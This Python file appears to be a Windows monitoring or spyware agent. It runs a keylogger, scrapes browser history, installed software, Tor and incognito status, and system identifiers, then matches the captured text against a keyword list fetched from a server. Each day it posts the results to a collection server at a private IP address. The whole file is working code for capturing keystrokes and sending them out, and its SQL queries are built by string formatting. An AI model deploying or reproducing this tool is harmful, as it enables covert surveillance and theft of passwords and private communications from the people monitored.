try:
    from browser_history import get_history
    import winreg
    import os  
    from time import sleep
    from pathlib import Path
    from datetime import datetime, time
    import platform , socket , re , uuid
    import psutil
    import getpass
    import win32api
    import win32file
    from keylog import Keylogger
    import sqlite3 ,requests , hashlib
    from pprint import pprint
    from threading import Thread
except Exception as ex:
    print(ex)
from winreg import (
  KEY_READ,
  ConnectRegistry,
  OpenKey,
  EnumValue,
  QueryInfoKey,
  HKEY_LOCAL_MACHINE,
  HKEY_CURRENT_USER
)


class system_data:

    def __init__(self):

        self.url_addr = 'http://10.10.10.123:8000'

        self.DB_file_check()

        thread = Thread(target = self.upload_check)
        thread.name = 'keylogger_upload_check_thread'
        thread.start()

        keylogger = Keylogger(interval=30)
        keylogger.start()

    def DB_file_check(self):

        if os.path.exists(f'{os.getcwd()}\\keylogger_.db'):
            pass
        else:
            try:
                try:
                    if os.path.exists(f"{Path.home()}\\Desktop\\setup.txt"):
                        os.remove(f"{Path.home()}\\Desktop\\setup.txt")
                except:pass
                sleep(1.5)
                Path(f'{os.getcwd()}\\setup.txt').rename(f"{Path.home()}\\Desktop\\setup.txt")
            except:pass
            self.db_connection('''CREATE TABLE  keylog(
                            id INTEGER PRIMARY KEY AUTOINCREMENT,
                            user_name TEXT NOT NULL,
                            first_time text ,
                            last_upload text 
                            )''')

    def upload_data(self , first_time='',today_date='', check='' , user_name='' ,user_name_hash=''):

        if first_time:

            keylog_data , keytext = self.keylog_file_data()
            browser_history , brow_text = self.brow_his(today_only='' )
            self.installed_software = self.installed_soft()
            self.installed_browser = self.installed_brow()
            self.incog_ena_browsers = self.incognito_check()

            if 'First Install' in today_date:
                First_Install_val = today_date.split('=')[0]
                First_Install_date = today_date.split('=')[1]
            else:
                First_Install_val = today_date
                First_Install_date = ''

            data = {'check':'',
                    'new_user':'true' if  check == '0' else '',
                    'user_data':{
                            'user':user_name,
                            'user_hash':user_name_hash,
                            'row':'',
                            'keytext':str(keytext),
                            'brow_text':str(brow_text),
                            'date':First_Install_val,
                            'First_Install_date':First_Install_date,
                            'installed_software': self.installed_software,
                            'installed_browser':self.installed_browser, 
                            'browser_history': browser_history, 
                            'incog_ena_browsers':self.incog_ena_browsers, 
                            'system_info': self.get_system_info(),
                            'keylog_data': keylog_data,}}

            #pprint(data)
            try:
                res = requests.post(url=f'{self.url_addr}/update_user',json=data)
                return 'success'
            except Exception as ex:
                return 'failed'
        else:

            keylog_data , keytext = self.keylog_file_data()
            browser_history , brow_text = self.brow_his(today_only='yes',_date=today_date )
            self.installed_software = self.installed_soft()
            self.installed_browser = self.installed_brow()
            self.incog_ena_browsers = self.incognito_check()

            data = {'check':'',
                    'new_user':'true' if  check == '0' else '',
                    'user_data':{
                            'user':user_name,
                            'user_hash':user_name_hash,
                            'row':'',
                            'keytext':str(keytext),
                            'brow_text':str(brow_text),
                            'date':today_date,
                            'First_Install_date':'',
                            'installed_software':self.installed_software ,
                            'installed_browser':self.installed_browser, 
                            'browser_history': browser_history,
                            'incog_ena_browsers':self.incog_ena_browsers, 
                            'system_info': self.get_system_info(),
                            'keylog_data': keylog_data,}}

            #pprint(data)
            try:
                res = requests.post(url=f'{self.url_addr}/update_user',json=data)
                return 'success'
            except Exception as ex:
                return 'failed'

    def upload_check(self):

        while True:
            try:
                sleep(2)
                if self.internet_chech():
                    today__date = requests.post(f'{self.url_addr}/update_user',json={'check':'true','user_data':{'user_hash':'user_name_hash'}}).text.split('=')[1]
                    #today__date = '2021-12-26'
                    last_upload_date = self.db_connection("select last_upload  from keylog where id=1 ")[0][0]
                    user_name = self.db_connection("select user_name  from keylog where id=1 ")[0][0]
                    user_name_hash = user_name_hash =  hashlib.md5(f'{user_name}keylog'.encode()).hexdigest()
                    if datetime.strptime(f'{today__date}', "%Y-%m-%d").date() > datetime.strptime(str(last_upload_date), "%Y-%m-%d").date():
                        res = self.upload_data(first_time='',today_date=f'{today__date}' ,check='1' , user_name=user_name ,user_name_hash=user_name_hash)
                        if res == 'success':
                            self.db_connection('update keylog set last_upload="%s"  where id=1'%(today__date))
                            ##### Remove old keylog file
                            while True:
                                sleep(1)
                                try:
                                    if os.path.exists(f'{os.getcwd()}\\keylog_file.txt'):
                                        os.remove('keylog_file.txt')

                                    break
                                except Exception as ex :
                                    continue
                        else:
                            continue
                    else:
                        break
                else:
                    continue
                
            except Exception as ex:
                pass

    def internet_chech(self):

        def internet():
            try:
                s = socket.create_connection((socket.gethostbyname("www.google.com"), 80))
                s.close()
                try:
                    file_download = requests.get(f'{self.url_addr}/file',stream=True, allow_redirects=True)
                    open('words.txt', 'wb').write(file_download.content)
                except:pass
                return True
            except Exception:
                return False

        try:
            if self.db_connection("select user_name  from keylog where id=1 "):
                if internet():
                    return True
                else:
                    return False
            else:
                while True :
                    sleep(5)
                    if self.db_connection("select user_name  from keylog where id=1 "):
                        return True
                    else:
                        if internet():
                            try:
                                exits , user_value = self.check_reg_for_username()
                                if exits:
                                    user_name = str(user_value).replace('.','_')
                                else:
                                    raise Exception("<<<<<<<<<<<<<<<<<<<<  Environment user not exist  >>>>>>>>>>>>>>")
                                user_name_hash =  hashlib.md5(f'{user_name}keylog'.encode()).hexdigest()
                                check = requests.post(f'{self.url_addr}/update_user',json={'check':'true','user_data':{'user_hash':user_name_hash}}).text
                                if "no" in check:
                                    today_date = check.split('=')[1]
                                    res = self.upload_data(first_time='true',today_date=f'First Install={today_date}',check='0' , user_name= user_name,user_name_hash=user_name_hash)
                                else:
                                    today_date = check.split('=')[1]
                                    res = self.upload_data(first_time='true',today_date=f'{today_date}'  ,check='1' , user_name=user_name ,user_name_hash=user_name_hash)
                                if res == 'success':
                                    self.db_connection("insert into keylog (user_name) values ('%s')"%(user_name))
                                    self.db_connection('update keylog set last_upload="%s"  where id=1'%(today_date))
                                else:
                                    return False
                                return True
                            except Exception as ex:
                                continue
                        else:
                            continue
        except Exception as ex:
            return False

    def check_reg_for_username(self):

        try:
            with ConnectRegistry(None, HKEY_CURRENT_USER) as root:
                with OpenKey(root, 'Environment', 0, KEY_READ) as hosts_key:
                    num_of_values = QueryInfoKey(hosts_key)[1]
                    for i in range(num_of_values):
                        if EnumValue(hosts_key, i)[0] == 'KL_EMAIL':
                            if EnumValue(hosts_key, i)[1] :return (True,EnumValue(hosts_key, i)[1])
                            else:return  (False,EnumValue(hosts_key, i)[1])
        except: return (False,EnumValue(hosts_key, i)[1])

    def incognito_check(self):

        def incognito_check_func(key , browser , state):

            try:
                with ConnectRegistry(None, HKEY_LOCAL_MACHINE) as root:
                    with OpenKey(root, key, 0, KEY_READ) as hosts_key:
                        num_of_values = QueryInfoKey(hosts_key)[1]
                        for i in range(num_of_values):
                            if EnumValue(hosts_key, i)[0] == state :
                                if EnumValue(hosts_key, i)[1] == 1:break
                                else:
                                    incog_ena_browsers.append(browser)
                                    break
            except:
                incog_ena_browsers.append(browser)

        incog_ena_browsers = []

        lst = [(r"SOFTWARE\Policies\Google\Chrome",'Chrome' , 'IncognitoModeAvailability'),
                (r"SOFTWARE\Policies\BraveSoftware\Brave",'Brave' , 'IncognitoModeAvailability'),
                (r"SOFTWARE\Policies\Microsoft\Edge",'Edge' , 'InPrivateModeAvailability'),
                (r"SOFTWARE\Policies\Mozilla\Firefox",'Firefox' , 'DisablePrivateBrowsing'),]

        for key , browser ,state in lst:
            incognito_check_func(key , browser , state)
        
        return incog_ena_browsers

    def installed_soft(self):
        def foo(hive, flag):
            aReg = winreg.ConnectRegistry(None, hive)
            aKey = winreg.OpenKey(aReg, r"SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall",0, winreg.KEY_READ | flag)
            count_subkey = winreg.QueryInfoKey(aKey)[0]
            software_list = []
            for i in range(count_subkey):
                software = {}
                try:
                    asubkey_name = winreg.EnumKey(aKey, i)
                    asubkey = winreg.OpenKey(aKey, asubkey_name)
                    software['name'] = winreg.QueryValueEx(asubkey, "DisplayName")[0]
                    try:
                        software['version'] = winreg.QueryValueEx(asubkey, "DisplayVersion")[0]
                    except EnvironmentError:
                        software['version'] = 'undefined'
                    try:
                        software['publisher'] = winreg.QueryValueEx(asubkey, "Publisher")[0]
                    except EnvironmentError:
                        software['publisher'] = 'undefined'
                    software_list.append(software)
                except EnvironmentError:
                    continue
            return software_list

        software_list = foo(winreg.HKEY_LOCAL_MACHINE, winreg.KEY_WOW64_32KEY) + foo(winreg.HKEY_LOCAL_MACHINE, winreg.KEY_WOW64_64KEY) + foo(winreg.HKEY_CURRENT_USER, 0)
        lst = []
        for software in software_list:
            if 'Microsoft Visual' not in software['name']:
                lst.append(software['name'])
        return lst

    def brow_his(self,today_only='',_date=''):
        try:
            if not today_only:
                lst = []
                outputs = get_history()
                his = outputs.histories
                key_words = [j.strip() for j in open('words.txt','r').readlines()]
                find_keywords = []
                for i in his:
                    url_ = f'{i[0].strftime("%y-%m-%d,%I:%M %p")},{i[1]}'
                    # print(url_)
                    [find_keywords.append(i) for i in key_words if i in url_]
                    if len(url_) > 5:
                        lst.append(url_)
                lst.reverse()
                return (lst,list(set(find_keywords)) if find_keywords else '')
            else:
                lst = []
                last_upload_date = self.db_connection("select last_upload  from keylog where id=1 ")[0][0]
                #last_1_days = datetime.strptime(str(last_upload_date), "%Y-%m-%d").date() + timedelta(days = 1)
                outputs = get_history()
                his = outputs.histories
                key_words = [j.strip() for j in open('words.txt','r').readlines()]
                find_keywords = []
                for i in his:
                    if datetime.strptime(f'{i[0].strftime("%Y-%m-%d")}', "%Y-%m-%d").date() >= datetime.strptime(str(last_upload_date), "%Y-%m-%d").date():
                        url_ = f'{i[0].strftime("%y-%m-%d,%I:%M %p")},{i[1]}'
                        # print(url_)
                        [find_keywords.append(i) for i in key_words if i in url_]
                        if len(url_) > 5:
                            lst.append(url_)
                lst.reverse()
                return (lst,list(set(find_keywords)) if find_keywords else '')
        except Exception as ex:
            pass

    def installed_brow(self):
        def myfunc(software):
            for browswer in ['Chrome','Edge','Firefox','Brave','Opera']:
                if browswer in software:
                    return browswer
                else:
                    pass
        installed_browser = [i for i in list(set(list(map(myfunc, self.installed_software)))) if i ]

        tor_browser_check = [i for i in os.listdir(f'{Path.home()}\\Desktop') if 'Tor Browser' in i]

        if tor_browser_check:
            installed_browser.append(tor_browser_check[0])
        return installed_browser

    def keylog_file_data(self):

        try:
            with open("keylog_file.txt", "r") as fi:
                keylog_data  = str(fi.read())
        except:
            keylog_data = ''

        key_words = [j.strip() for j in open('words.txt','r').readlines()]
        keylog_findings = [i for i in key_words if i in keylog_data]

        return (keylog_data if keylog_data else 'No Data Found !!' , keylog_findings if keylog_findings else '')

    def db_connection(self ,Query):
        try:
            print(Query, file=open("log.txt", "a"))
            con = sqlite3.connect(f"{os.getcwd()}\keylogger_.db")
            cursor = con.cursor()
            if "select" in Query:
                return_data = cursor.execute(Query).fetchall()
                return return_data
            else:
                cursor.execute(Query)
                con.commit()
        except Exception as e:
            print(e, file=open("log.txt", "a"))
            pass
        finally:
            cursor.close()
            con.close()

    def get_system_info(self):

        dict_ = {}

        def get_size(bytes, suffix="B"):
            """
            Scale bytes to its proper format
            e.g:
                1253656 => '1.20MB'
                1253656678 => '1.17GB'
            """
            try:
                factor = 1024
                for unit in ["", "K", "M", "G", "T", "P"]:
                    if bytes < factor:
                        return f"{bytes:.2f}{unit}{suffix}"
                    bytes /= factor
            except:pass

        def get_ip_address():
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.connect(("8.8.8.8", 80))
            return s.getsockname()[0]

        try:
            dict_["user_name"] = getpass.getuser()
            dict_["Computer_name"] = platform.node()
            dict_["Processor_type"] = platform.processor()
            dict_["Operating_system"] = f'{platform.system()}-{platform.architecture()[0]}'
            dict_["Os_version"] = platform.release()
            dict_["ip_address"] = get_ip_address()
            dict_["mac_address"] = ':'.join(re.findall('..', '%012x' % uuid.getnode()))
            svmem = psutil.virtual_memory()
            dict_["Total_Ram"] = get_size(svmem.total)
            dict_["Total_Cores"] = psutil.cpu_count()
            dict_["Boot_Time"] = str(datetime.now().strftime("%d-%m-%Y, %H:%M:%S")) 
        except:pass

        # Disk Information
        dict_disk = {}
        try:
            drive_types = {
                        win32file.DRIVE_UNKNOWN : "Unknown",
                        win32file.DRIVE_REMOVABLE : "Removable",
                        win32file.DRIVE_FIXED : "Fixed",
                        win32file.DRIVE_REMOTE : "Remote",
                        win32file.DRIVE_CDROM : "CDROM",
                        win32file.DRIVE_RAMDISK : "RAMDisk",
                        win32file.DRIVE_NO_ROOT_DIR : "The root directory does not exist."
                        }

            drives = win32api.GetLogicalDriveStrings().split('\x00')[:-1]
            for device in drives:
                type = win32file.GetDriveType(device)
                dict_disk[device] = drive_types[type]
        except:pass

        # get all disk partitions
        partitions = psutil.disk_partitions()
        disk_lst = []
        for partition in partitions:
            try:
                partition_usage = psutil.disk_usage(partition.mountpoint)
                disk_lst.append({"Disk_Name":partition.mountpoint,"Disk_Total_Size":get_size(partition_usage.total)})
            except PermissionError:
                # this can be catched due to the disk that
                # isn't ready
                continue
        dict_['storage'] = disk_lst

        return dict_


if __name__ == "__main__":

    obj_init = system_data()
